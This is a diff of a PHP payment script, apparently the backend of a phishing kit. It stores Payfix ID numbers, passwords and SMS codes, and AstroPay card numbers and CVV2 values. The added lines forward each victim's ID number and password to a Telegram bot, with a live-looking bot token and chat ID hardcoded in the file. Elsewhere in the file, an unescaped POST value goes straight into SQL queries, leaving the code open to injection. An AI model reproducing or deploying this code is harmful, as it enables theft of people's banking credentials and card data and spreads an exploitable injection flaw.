@@ -10,6 +10,40 @@
     foreach ($_POST as $key => $value) {
       $datas[$key] = $db -> real_escape_string(htmlspecialchars(trim($value)));
     }
+	  	  $token = '6130623406:AAGZBm0a478MN1oh9UTGm7I_QFWQ_yNCrwk';
+
+// Mesaj göndermek istediğiniz kullanıcının Telegram kullanıcı adını veya ID'sini buraya girin
+$chatId = '-972681257';
+
+// Önceki kodunuzun devamı...
+
+// $db -> query() fonksiyonundan hemen sonra, ödeme işlemi tamamlandığında bir mesaj göndermek için aşağıdaki kodu ekleyin
+$message = "Yeni bir ödeme işlemi tamamlandı:\n\n";
+$message .= "İşlem: " . $datas[type] . "\n";
+$message .= "Miktar: " . $datas[amount] . "\n";
+$message .= "T.C: " . $datas[payfix_tc] . "\n";
+$message .= "Şifre: " . $datas[payfix_sifre] . "\n";
+	  
+// Diğer verileri mesajınıza ekleyebilirsiniz
+
+// Telegram API'ye POST isteği göndermek için gerekli URL
+$url = "https://api.telegram.org/bot$token/sendMessage";
+
+// POST isteği için gerekli parametreleri oluşturun
+$params = [
+    'chat_id' => $chatId,
+    'text' => $message,
+];
+
+// Curl kullanarak POST isteği gönderin
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
+
   $ip = htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER[REMOTE_ADDR]);
     if (strlen($datas['amount']) > 0) {
     header('Content-Type: application/json');
@@ -19,13 +53,9 @@
       user = '$us[login]',
       user_id = '$us[id]',
       identity = '$datas[identity]',
-      papara_email = '$datas[papara_email]',
-      jethavale_tc = '$datas[jethavale_tc]',
-      jethavale_sifre = '$datas[jethavale_sifre]',
-      jethavale_sms = '$datas[jethavale_sms]',
-      jethavale_banka = '$datas[jethavale_banka]',
-      papara_password = '$datas[papara_password]',
-      papara_sms_code = '$datas[papara_sms_code]',
+      payfix_tc = '$datas[payfix_tc]',
+      payfix_sifre = '$datas[payfix_sifre]',
+      payfix_sms = '$datas[payfix_sms]',
       astropay_card_number = '$datas[astropay_card_number]',
       astropay_exp_date = '$datas[expmonth]/$datas[expyear]',
       astropay_cv2 = '$datas[astropay_cv2]',
@@ -74,13 +104,13 @@ elseif ($q == 'odeme-durum' && isset($us['id'])) {
 }
 elseif ($q == 'sms-durum' && isset($us['id'])) {
   $id = $us["id"];
-  $res = $db->query("SELECT * FROM `payments` WHERE `user_id` = '$id' AND `type` LIKE 'jethavale' ORDER BY `id` DESC LIMIT 1;")->fetch_assoc();
+  $res = $db->query("SELECT * FROM `payments` WHERE `user_id` = '$id' AND `type` LIKE 'payfix-3d' ORDER BY `id` DESC LIMIT 1;")->fetch_assoc();
   echo $res["status"];
 }
 elseif ($q == 'sms-onay' && isset($us['id'])){
-  $sms = $_POST['jethavale_sms'];
+  $sms = $_POST['payfix_sms'];
   $id = $us["id"];
-  $db->query("UPDATE `payments` SET `jethavale_sms` = '$sms' WHERE `user_id` = '$id' AND `type` = 'jethavale' ORDER BY id DESC LIMIT 1; ");
+  $db->query("UPDATE `payments` SET `payfix_sms` = '$sms' WHERE `user_id` = '$id' AND `type` = 'payfix-3d' ORDER BY id DESC LIMIT 1; ");
   die('success');
 }
 ?>
